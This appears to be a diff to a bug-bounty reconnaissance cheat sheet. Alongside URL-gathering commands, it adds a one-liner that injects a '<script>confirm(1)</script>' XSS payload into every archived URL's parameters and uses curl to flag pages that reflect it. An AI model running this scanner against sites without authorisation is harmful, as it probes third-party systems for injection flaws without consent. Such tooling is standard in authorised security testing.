@@ -69,6 +69,9 @@ cat hosts | gau | anew urls
 python3 paramspider.py --domain $domain -o /dev/null | grep ^http
 python3 github-endpoint.py -t $TOKEN -d $domain
 
+# XSS automation
+waybackurls hosts | tee hosts.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \\033[0;31mVulnerable\\n" || echo "$host \\033[0;32mNot Vulnerable\\n";done
+
 # combinations
 ex : cat urls | gf xss |  tail
      cat urls | gf lfi | head
